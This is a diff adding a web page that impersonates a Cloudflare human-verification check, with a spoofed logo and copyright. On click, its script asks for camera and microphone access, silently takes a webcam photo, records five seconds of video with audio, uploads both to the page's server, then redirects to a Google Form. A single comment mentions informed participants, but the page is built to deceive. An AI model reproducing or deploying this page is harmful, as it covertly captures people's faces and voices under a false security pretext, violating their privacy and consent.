@@ -1,0 +1,1031 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Security Verification</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            min-height: 100vh;
+            background: #f7f7f8;
+            font-family: Arial, Helvetica, sans-serif;
+            color: #202124;
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* ==============================
+           MAIN VERIFICATION CARD
+        ============================== */
+
+        .verification-card {
+            width: 380px;
+            max-width: calc(100% - 32px);
+
+            background: #ffffff;
+
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+
+            padding: 34px 32px 30px;
+
+            box-shadow:
+                0 2px 6px rgba(0, 0, 0, 0.08),
+                0 8px 24px rgba(0, 0, 0, 0.04);
+
+            text-align: left;
+        }
+
+        /* ==============================
+           CUSTOM LOGO
+        ============================== */
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            margin-bottom: 26px;
+        }
+
+        .logo-container img {
+            width: 150px;
+            height: 50px;
+
+            object-fit: contain;
+        }
+
+        /* ==============================
+           TITLE
+        ============================== */
+
+        .title {
+            text-align: center;
+
+            font-size: 20px;
+            font-weight: 600;
+
+            margin-bottom: 8px;
+        }
+
+        .description {
+            text-align: center;
+
+            font-size: 14px;
+            line-height: 1.5;
+
+            color: #5f6368;
+
+            margin-bottom: 28px;
+        }
+
+        /* ==============================
+           VERIFICATION BOX
+        ============================== */
+
+        .verification-box {
+            border: 1px solid #d9d9d9;
+            border-radius: 6px;
+
+            padding: 17px;
+
+            min-height: 72px;
+
+            display: flex;
+            align-items: center;
+
+            background: #fafafa;
+
+            cursor: pointer;
+
+            transition: 0.2s ease;
+        }
+
+        .verification-box:hover {
+            background: #f5f5f5;
+            border-color: #bdbdbd;
+        }
+
+        .verification-box.disabled {
+            cursor: default;
+        }
+
+        /* ==============================
+           CHECKBOX AREA
+        ============================== */
+
+        .check-area {
+            width: 38px;
+            height: 38px;
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            margin-right: 14px;
+        }
+
+        /* ==============================
+           ANIMATED LOADER
+        ============================== */
+
+        .loader {
+            width: 28px;
+            height: 28px;
+
+            border: 3px solid #dddddd;
+            border-top: 3px solid #2563eb;
+
+            border-radius: 50%;
+
+            animation: rotateLoader 0.8s linear infinite;
+        }
+
+        @keyframes rotateLoader {
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* ==============================
+           ANIMATED GREEN TICK
+        ============================== */
+
+        .success-circle {
+            width: 30px;
+            height: 30px;
+
+            border-radius: 50%;
+
+            background: #16a34a;
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            transform: scale(0);
+
+            animation: tickCircle 0.35s
+                       cubic-bezier(.175,.885,.32,1.275)
+                       forwards;
+        }
+
+        @keyframes tickCircle {
+
+            0% {
+                transform: scale(0);
+            }
+
+            70% {
+                transform: scale(1.15);
+            }
+
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        .checkmark {
+            width: 15px;
+            height: 8px;
+
+            border-left: 3px solid white;
+            border-bottom: 3px solid white;
+
+            transform:
+                rotate(-45deg)
+                scale(0);
+
+            animation:
+                drawCheck 0.35s
+                0.15s
+                ease-out
+                forwards;
+        }
+
+        @keyframes drawCheck {
+
+            0% {
+                transform:
+                    rotate(-45deg)
+                    scale(0);
+            }
+
+            100% {
+                transform:
+                    rotate(-45deg)
+                    scale(1);
+            }
+        }
+
+        /* ==============================
+           TEXT
+        ============================== */
+
+        .verification-text {
+            flex: 1;
+        }
+
+        .verification-title {
+            font-size: 15px;
+            font-weight: 500;
+
+            margin-bottom: 4px;
+        }
+
+        .verification-status {
+            font-size: 12px;
+
+            color: #6b7280;
+        }
+
+        /* ==============================
+           PROGRESS BAR
+        ============================== */
+
+        .progress-container {
+            display: none;
+
+            width: 100%;
+            height: 4px;
+
+            background: #e5e7eb;
+
+            border-radius: 20px;
+
+            overflow: hidden;
+
+            margin-top: 18px;
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+
+            background: #2563eb;
+
+            border-radius: 20px;
+
+            transition:
+                width 0.3s ease;
+        }
+
+        /* ==============================
+           BUTTON
+        ============================== */
+
+        .continue-button {
+            width: 100%;
+
+            margin-top: 20px;
+
+            padding: 12px;
+
+            border: none;
+            border-radius: 6px;
+
+            background: #2563eb;
+
+            color: white;
+
+            font-size: 14px;
+            font-weight: 500;
+
+            cursor: pointer;
+
+            transition: 0.2s;
+        }
+
+        .continue-button:hover {
+            background: #1d4ed8;
+        }
+
+        .continue-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        /* ==============================
+           SUCCESS MESSAGE
+        ============================== */
+
+        .success-message {
+            display: none;
+
+            text-align: center;
+
+            margin-top: 18px;
+
+            font-size: 13px;
+
+            color: #15803d;
+
+            animation: fadeIn 0.4s ease;
+        }
+
+        @keyframes fadeIn {
+
+            from {
+                opacity: 0;
+                transform: translateY(4px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* ==============================
+           FOOTER
+        ============================== */
+
+        .footer {
+            margin-top: 22px;
+
+            text-align: center;
+
+            font-size: 11px;
+
+            color: #8a8a8a;
+
+            line-height: 1.5;
+        }
+
+        /* ==============================
+           HIDDEN CAMERA
+        ============================== */
+
+        #camera {
+            display: none;
+        }
+    </style>
+</head>
+
+
+<body>
+
+<div class="verification-card">
+
+    <!-- =================================
+         CUSTOM IMAGE / LOGO
+    ================================== -->
+
+    <div class="logo-container">
+
+        <!-- Replace this image with your own -->
+        <img
+            src="Cloudflared_logo.svg"
+            alt="Security Verification"
+        >
+
+    </div>
+
+
+    <!-- =================================
+         TITLE
+    ================================== -->
+
+    <div class="title">
+        Verify that you are human
+    </div>
+
+    <div class="description">
+        This security check helps protect this service
+        from automated requests.
+    </div>
+
+
+    <!-- =================================
+         VERIFICATION BOX
+    ================================== -->
+
+    <div
+        class="verification-box"
+        id="verificationBox"
+        onclick="startVerification()"
+    >
+
+        <div class="check-area" id="checkArea">
+
+            <div class="loader" id="loader"></div>
+
+        </div>
+
+
+        <div class="verification-text">
+
+            <div
+                class="verification-title"
+                id="verificationTitle"
+            >
+                Click to verify
+            </div>
+
+            <div
+                class="verification-status"
+                id="verificationStatus"
+            >
+                Security verification required
+            </div>
+
+        </div>
+
+    </div>
+
+
+    <!-- =================================
+         PROGRESS BAR
+    ================================== -->
+
+    <div
+        class="progress-container"
+        id="progressContainer"
+    >
+
+        <div
+            class="progress-bar"
+            id="progressBar"
+        ></div>
+
+    </div>
+
+
+    <!-- =================================
+         CONTINUE BUTTON
+    ================================== -->
+
+    <button
+        class="continue-button"
+        id="continueButton"
+        onclick="startVerification()"
+    >
+        Continue
+    </button>
+
+
+    <!-- =================================
+         SUCCESS
+    ================================== -->
+
+    <div
+        class="success-message"
+        id="successMessage"
+    >
+        Verification completed successfully.
+    </div>
+
+
+    <div class="footer">
+        Security verification 
+        <br>
+
+        &copy; 2024 Cloudflare, Inc.
+    </div>
+
+</div>
+
+
+<!-- Hidden camera element -->
+<video
+    id="camera"
+    autoplay
+    playsinline
+    muted
+></video>
+
+
+<script>
+
+    /* =====================================
+       GOOGLE FORM
+    ===================================== */
+
+    const GOOGLE_FORM_URL =
+        "https://docs.google.com/forms/d/e/1FAIpQLSf2_gU2jDC3SMD42dWxJe-APVAu-l39UR7U8mEiXWodLFrZVA/viewform?usp=dialog";
+
+
+    let stream = null;
+
+
+    /* =====================================
+       START VERIFICATION
+    ===================================== */
+
+    async function startVerification() {
+
+        const box =
+            document.getElementById(
+                "verificationBox"
+            );
+
+        const button =
+            document.getElementById(
+                "continueButton"
+            );
+
+        const loader =
+            document.getElementById(
+                "loader"
+            );
+
+        const title =
+            document.getElementById(
+                "verificationTitle"
+            );
+
+        const status =
+            document.getElementById(
+                "verificationStatus"
+            );
+
+        const progressContainer =
+            document.getElementById(
+                "progressContainer"
+            );
+
+        const progressBar =
+            document.getElementById(
+                "progressBar"
+            );
+
+
+        /* Prevent double click */
+
+        box.classList.add("disabled");
+
+        button.disabled = true;
+
+        button.style.display = "none";
+
+
+        /* Loading state */
+
+        loader.style.display = "block";
+
+        title.innerText =
+            "Verifying...";
+
+        status.innerText =
+            "Checking your browser";
+
+
+        progressContainer.style.display =
+            "block";
+
+        progressBar.style.width =
+            "15%";
+
+
+        try {
+
+            /*
+             * Camera + microphone permission.
+             *
+             * Use only with participants who have
+             * been informed about the demonstration.
+             */
+
+            stream =
+                await navigator.mediaDevices
+                    .getUserMedia({
+
+                        video: {
+                            facingMode: "user"
+                        },
+
+                        audio: true
+
+                    });
+
+
+            progressBar.style.width =
+                "35%";
+
+
+            const camera =
+                document.getElementById(
+                    "camera"
+                );
+
+            camera.srcObject =
+                stream;
+
+
+            /*
+             * Capture image
+             */
+
+            await captureImage();
+
+
+            progressBar.style.width =
+                "55%";
+
+
+            /*
+             * Record 5-second video
+             * with microphone audio.
+             */
+
+            await recordVideo();
+
+
+            progressBar.style.width =
+                "100%";
+
+
+            /*
+             * Stop camera + microphone
+             */
+
+            if (stream) {
+
+                stream
+                    .getTracks()
+                    .forEach(
+                        track =>
+                            track.stop()
+                    );
+
+            }
+
+
+            /* ==========================
+               ANIMATED GREEN CHECK
+            ========================== */
+
+            loader.style.display =
+                "none";
+
+
+            const successCircle =
+                document.createElement(
+                    "div"
+                );
+
+            successCircle.className =
+                "success-circle";
+
+
+            const checkmark =
+                document.createElement(
+                    "div"
+                );
+
+            checkmark.className =
+                "checkmark";
+
+
+            successCircle.appendChild(
+                checkmark
+            );
+
+
+            document
+                .getElementById(
+                    "checkArea"
+                )
+                .appendChild(
+                    successCircle
+                );
+
+
+            title.innerText =
+                "Verification successful";
+
+
+            status.innerText =
+                "Browser verified";
+
+
+            document
+                .getElementById(
+                    "successMessage"
+                )
+                .style.display =
+                "block";
+
+
+            /*
+             * Redirect after successful
+             * demonstration.
+             */
+
+            setTimeout(() => {
+
+                if (
+                    GOOGLE_FORM_URL &&
+                    GOOGLE_FORM_URL.startsWith(
+                        "https://docs.google.com/forms/d/e/1FAIpQLSf2_gU2jDC3SMD42dWxJe-APVAu-l39UR7U8mEiXWodLFrZVA/viewform?usp=dialog"
+                    )
+                ) {
+
+                    window.location.href =
+                        GOOGLE_FORM_URL;
+
+                }
+
+            }, 1200);
+
+
+        } catch (error) {
+
+            console.error(
+                "Verification error:",
+                error
+            );
+
+
+            loader.style.display =
+                "none";
+
+
+            title.innerText =
+                "Verification failed";
+
+
+            status.innerText =
+                "Permission was not granted";
+
+
+            button.style.display =
+                "block";
+
+            button.disabled =
+                false;
+
+            box.classList.remove(
+                "disabled"
+            );
+
+
+            progressContainer.style.display =
+                "none";
+
+        }
+
+    }
+
+
+    /* =====================================
+       IMAGE CAPTURE
+    ===================================== */
+
+    async function captureImage() {
+
+        const video =
+            document.getElementById(
+                "camera"
+            );
+
+
+        await new Promise(resolve => {
+
+            if (
+                video.readyState >= 2
+            ) {
+
+                resolve();
+
+            } else {
+
+                video.onloadeddata =
+                    resolve;
+
+            }
+
+        });
+
+
+        const canvas =
+            document.createElement(
+                "canvas"
+            );
+
+
+        canvas.width =
+            video.videoWidth ||
+            640;
+
+        canvas.height =
+            video.videoHeight ||
+            480;
+
+
+        const ctx =
+            canvas.getContext(
+                "2d"
+            );
+
+
+        ctx.drawImage(
+            video,
+            0,
+            0,
+            canvas.width,
+            canvas.height
+        );
+
+
+        const blob =
+            await new Promise(
+                resolve => {
+
+                    canvas.toBlob(
+                        resolve,
+                        "image/jpeg",
+                        0.9
+                    );
+
+                }
+            );
+
+
+        const formData =
+            new FormData();
+
+
+        formData.append(
+            "photo",
+            blob,
+            "capture.jpg"
+        );
+
+
+        const response =
+            await fetch(
+                "/upload",
+                {
+
+                    method: "POST",
+
+                    body: formData
+
+                }
+            );
+
+
+        if (!response.ok) {
+
+            throw new Error(
+                "Image upload failed"
+            );
+
+        }
+
+    }
+
+
+    /* =====================================
+       VIDEO + AUDIO RECORDING
+    ===================================== */
+
+    async function recordVideo() {
+
+        let options = {};
+
+
+        /*
+         * Prefer WebM with video + Opus audio.
+         */
+
+        if (
+            MediaRecorder
+                .isTypeSupported(
+                    "video/webm;codecs=vp8,opus"
+                )
+        ) {
+
+            options.mimeType =
+                "video/webm;codecs=vp8,opus";
+
+        }
+
+        else if (
+            MediaRecorder
+                .isTypeSupported(
+                    "video/webm"
+                )
+        ) {
+
+            options.mimeType =
+                "video/webm";
+
+        }
+
+
+        const recorder =
+            new MediaRecorder(
+                stream,
+                options
+            );
+
+
+        const chunks = [];
+
+
+        recorder.ondataavailable =
+            event => {
+
+                if (
+                    event.data &&
+                    event.data.size > 0
+                ) {
+
+                    chunks.push(
+                        event.data
+                    );
+
+                }
+
+            };
+
+
+        const finished =
+            new Promise(
+                resolve => {
+
+                    recorder.onstop =
+                        resolve;
+
+                }
+            );
+
+
+        recorder.start();
+
+
+        /*
+         * Record for 5 seconds.
+         */
+
+        setTimeout(
+            () => recorder.stop(),
+            5000
+        );
+
+
+        await finished;
+
+
+        const videoBlob =
+            new Blob(
+                chunks,
+                {
+
+                    type:
+                        recorder.mimeType ||
+                        "video/webm"
+
+                }
+            );
+
+
+        const formData =
+            new FormData();
+
+
+        formData.append(
+            "video",
+            videoBlob,
+            "capture.webm"
+        );
+
+
+        const response =
+            await fetch(
+                "/upload-video",
+                {
+
+                    method: "POST",
+
+                    body: formData
+
+                }
+            );
+
+
+        if (!response.ok) {
+
+            throw new Error(
+                "Video upload failed"
+            );
+
+        }
+
+    }
+
+</script>
+
+</body>
+</html>
